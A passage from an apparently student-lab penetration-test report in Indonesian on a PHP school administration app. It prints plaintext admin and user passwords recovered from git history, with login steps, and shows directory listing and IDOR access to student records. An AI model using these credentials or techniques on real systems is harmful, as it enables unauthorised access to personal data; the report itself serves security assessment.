+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        // AMBIL USERNAME & PASSWORD
+        // JANGAN trim password
+        // Karena spasi bisa menjadi bagian dari password
+        $password = $_POST['password'] ?? '';
+        if ($username === '' || $password === '') {
+            $error = "Username dan password harus diisi.";
+            if ($auth->login($username, $password)) {
+                // Buat CSRF token baru setelah login
+                $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+                // apakah username atau password yang salah
+                $error = "Username atau password salah.";
+                // Token CSRF diganti setelah percobaan gagal
+                $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+            <!-- CSRF TOKEN -->
+                name="csrf_token"
+                value="<?= htmlspecialchars($_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8'); ?>"
+                 PASSWORD
+                    for="password"
+                    Password
+                        type="password"
+                        name="password"
+                        id="password"
+                        placeholder="Masukkan password"
+                        autocomplete="new-password"
+    const password = document.getElementById('password');
+    if (password) {
+        password.value = '';
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    $token = $_POST['csrf_token'] ?? '';
+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
+        $error = "Token CSRF tidak valid.";
+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
+// Validasi Metode POST dan Token CSRF
+    $token = $_POST['csrf_token'] ?? '';
+    if (empty($_SESSION['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $token)) {
+        die("Akses ditolak! Token CSRF tidak valid.");
+// Inisialisasi CSRF Token
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+                                                    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    $token = $_POST['csrf_token'] ?? '';
+    if (!hash_equals($_SESSION['csrf_token'], $token)) {
+        $error = "Token CSRF tidak valid.";
+                <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
```
##### JACKPOT - Credential Ditemukan di Git History

Dari git log -p, ketemu plaintext credential yang dihapus di commit terakhir (54cffb3) tapi masih tersimpan di history. Ini klasik banget.
🔑 Credential yang Didapat

| Role	|Username	| Password      |
|-------|-----------|---------------|
|Admin	|admin	    | kalinadmin08  |
|User	|user	    | user99887711  |

Dari commit b8552be (First commit) - file fix.php yang sengaja dihapus di commit 54cffb3 ("Hapus file skrip pemulihan fix.php demi keamanan").

Ironinya: mereka hapus filenya, tapi lupa hapus dari git history.

### Cara Eskploitasi

```
URL: http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/login.php
Username: admin
Password: kalinadmin08

Username: user
Password: user99887711
```

### Dampak:
- **Full access ke aplikasi** sebagai admin
- Bisa CRUD data siswa, guru, kelas, absensi
- Bisa upload file

## TEMUAN 4: Directory ListingAktif (MEDIUM)
### Apa Yang Ditemukan?

```
http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/uploads/
```

### Cara Eksploitasi:
- **Enumerasi file** - lihat semua file yang pernah di-upload
- **Akses file sensitif** - foto siswa, surat dokter
- **Cari file `.php`** - kalau ada yang ke-upload sebelumnya

### Dampak:
- **Information disclosure** - data siswa & surat dokter bisa diakses
- **Reconnaissance** - tau struktur file upload

## TEMUAN 5 : BUSSINES LOGIC
### Apa yang ditemukan

```php
<td><span class="badge bg-light text-dark border"><?= htmlspecialchars($row['nisn']); ?></span></td>
<td class="fw-bold text-dark"><?= htmlspecialchars($row['nama']); ?></td>
```
Nggak ada fungsi **Numeric** dan **MySQL PHPMyadmin** menggunakan VARCHAR

### Cara Eksploitasi
Input pada **siswa_list.php** `-, /, 0, atau sebagai nya yang tidak sesuai dengan format NISN`

### Dampak
- Data tidak akurat dan mempersulit maintenence

## TEMUAN 6: IDOR di `siswa_detail.php` (LOW)

### Apa yang ditemukan?

```php
$id = $_GET['id'] ?? null;
$query = "SELECT ... WHERE siswa.id = :id LIMIT 1";
$stmt->bindValue(':id', $id, PDO::PARAM_INT);
```
**Nggak ada validasi kepemilikan** - user bisa ganti `?id=6` jadi `?id=7`.

### Cara Eksploitasi:

```
http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/siswa_detail.php?id=6
http://192.168.100.247/UK-PKL_Banjar/UK1-Kalina/siswa_detail.php?id=7
...
```

### Dampak:
- **Low** - cuma data siswa, dan admin emang boleh lihat semua
- **Nggak berguna** karena data siswa emang buat admin